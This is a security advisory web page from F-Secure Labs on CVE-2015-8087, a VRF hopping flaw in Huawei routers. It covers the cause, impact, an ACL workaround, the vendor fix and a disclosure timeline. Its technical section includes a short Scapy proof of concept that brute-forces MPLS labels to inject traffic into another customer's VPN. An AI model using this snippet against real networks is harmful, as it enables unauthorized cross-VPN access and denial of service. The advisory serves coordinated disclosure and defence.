<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Huawei VRF Hopping Vulnerability</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/huawei-vrf-hopping-vulnerability/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/huawei-vrf-hopping-vulnerability/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/huawei-vrf-hopping-vulnerability/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type">Advisories</span>
      <h1>Huawei VRF Hopping Vulnerability</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Huawei Versatile Routing Platform (VRP)</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>Medium</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2015-8087</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>VRF Hopping Vulnerability</td>
          </tr>
        </table>
        
        <h3>Description</h3>
<p>Virtual Routing and Forwarding (VRF) allows multiple instances of a routing table to exist and operate simultaneously on the same physical device. This technology can be applied for Layer 3 network segmentation, analogous to Virtual LAN (VLAN) on Layer 2. VRF is commonly used as a building block for Layer 3 Virtual Private Network (VPN) services in Multiprotocol Label Switching (MPLS) networks.</p>
<p>A Virtual Routing and Forwarding (VRF) hopping vulnerability exists in a number of Huawei routers. The affected routers fail to discard maliciously crafted MPLS traffic which can be remotely exploited by an attacker to forward traffic from one VPN to another VPN using MPLS links.</p>
<h3>Impact</h3>
<p>Successful VRF hopping attacks can result in forwarding traffic into an arbitrary VRF or potentially lead to a Denial of Service (DoS) condition.</p>
<h3>Cause</h3>
<p>Certain routers fail to discard customer-generated MPLS traffic received on a Provider Edge (PE) link to a Customer Edge (CE) device.</p>
<h3><br>Interim Workaround</h3>
<p>A possible workaround is to apply a Layer 2 Access Control List (ACL) on a PE's customer-facing interface. This ACL must be configured to discard traffic pre-encapsulated in MPLS, which is achieved by filtering out Ethernet frames with EtherType of 0x8847.</p>
<h3>Solution</h3>
<p>Software updates have been released by the vendor to address the VRF hopping vulnerability. Please refer to Huawei’s security advisory for detailed information on affected versions and the available software fixes [1].</p>
<h3>Technical Details</h3>
<p>An adversary with access to a CE device can pre-encapsulate her traffic in MPLS in order to coerce a PE router into forwarding her traffic on to an arbitrary VRF. The attacker can either assign a fixed label value or, in the case of an unknown label, can perform a brute-force attack of a valid label.</p>
<p>The following Scapy snippet can be used to reproduce the attack, where '192.168.100.2' and '192.168.201.2' are the attacker’s and victim’s IP addresses respectively.</p>
<pre><br><span>&gt;&gt;&gt; load_contrib('mpls') </span><br><span>&gt;&gt;&gt; a = Ether(src = '08:00:27:12:27:13', dst = 'XX:XX:XX:a3:7b:01') </span><br><span>&gt;&gt;&gt; b = MPLS(ttl = 64, label = range(1000, 1500)) </span><br><span>&gt;&gt;&gt; c = IP(src = '192.168.100.2', dst = '192.168.201.2') </span><br><span>&gt;&gt;&gt; d = ICMP() &gt;&gt;&gt; sendp(a/b/c/d) </span><br><span>... </span><br><span>Sent 500 packets. </span><br><span>&gt;&gt;&gt;</span></pre>
<div class="WordSection1">
<p>For further details, possible attack scenarios and limitations, please refer to G. Geshev’s slide deck from B-Sides NYC [2].</p>
<p><span style="color: #00f1a3; font-family: &#039;Source Code Pro&#039;, &#039;Lucida Grande&#039;, &#039;Lucida Sans Unicode&#039;, &#039;Lucida Sans&#039;, Geneva, Verdana, sans-serif; font-size: 1.5em; line-height: 1.2em;">Detailed Timeline<br><br></span></p>
</div>
<table cellspacing="0" cellpadding="0"><tbody><tr><td width="248" valign="top">
<p class="TableParagraph">Date</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Summary</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-05-07</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Initial contact with Huawei</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-05-08</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Vendor requesting details from MWR</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-05-08</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Preliminary discovery disclosed to Huawei</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-06-25</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Further technical details provided by MWR</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-06-25</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Technical details acknowledged by Huawei</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-10</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">MWR request an update</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-11</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Huawei confirms tests are in progress</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-14</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Huawei provides preliminary results</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-14</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">MWR acknowledges reception</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-20</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Huawei requesting further details</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-20</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Further technical details provided by MWR</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-07-25</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Huawei confirms a number of products are affected</p>
</td>
</tr><tr><td width="248" valign="top">
<p class="TableParagraph">2015-10-21</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Fix released by Huawei</p>
</td>
</tr></tbody></table><p> </p>
<p>[1] <a href="http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c04779492">http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c04779492</a></p>
<p>[2] <a href="https://github.com/bsidesnyc/BSidesNYC2016/raw/master/Presentations/G.%20Geshev%20-%20Warranty%20Void%20If%20Label%20Removed.pdf">https://github.com/bsidesnyc/BSidesNYC2016/raw/master/Presentations/G. Geshev - Warranty</a> <a href="https://github.com/bsidesnyc/BSidesNYC2016/raw/master/Presentations/G.%20Geshev%20-%20Warranty%20Void%20If%20Label%20Removed.pdf">Void If Label Removed.pdf</a></p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/huawei-vrf-hopping-vulnerability/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/huawei-vrf-hopping-vulnerability/&text=Huawei VRF Hopping Vulnerability" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/huawei-vrf-hopping-vulnerability/&title=Huawei VRF Hopping Vulnerability" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      
      <a href="/assets/BlogFiles/MWR-Labs-G.-Geshev-Huawei-VRF-Hopping-Vulnerability.pdf" class="flex-container__box">
            <span class="content-type">Download</span>
            
            <h3 class="flex-container__box-title">Download the advisory here.</h3>
            
      </a>
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/huawei-vrf-hopping-vulnerability/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
